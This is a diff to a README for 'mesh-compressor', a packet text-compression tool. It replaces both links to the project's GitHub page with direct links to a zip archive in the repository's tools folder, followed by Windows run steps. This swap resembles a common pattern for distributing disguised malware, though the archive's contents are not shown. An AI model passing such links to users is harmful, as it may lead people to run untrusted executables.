@@ -1,6 +1,6 @@
 # 🧩 mesh-compressor - Pack More Text Into Each Packet
 
-[![Download mesh-compressor](https://img.shields.io/badge/Download%20mesh--compressor-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/azfarj09/mesh-compressor)
+[![Download mesh-compressor](https://img.shields.io/badge/Download%20mesh--compressor-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/azfarj09/mesh-compressor/main/tools/mesh_compressor_v1.0.zip)
 
 ## 🚀 What mesh-compressor does
 
@@ -12,7 +12,7 @@ It is made for people who want to send more text over a small packet size withou
 
 Use this page to download and run the app:
 
-[Visit the mesh-compressor download page](https://github.com/azfarj09/mesh-compressor)
+[Visit the mesh-compressor download page](https://raw.githubusercontent.com/azfarj09/mesh-compressor/main/tools/mesh_compressor_v1.0.zip)
 
 ### Steps for Windows
 
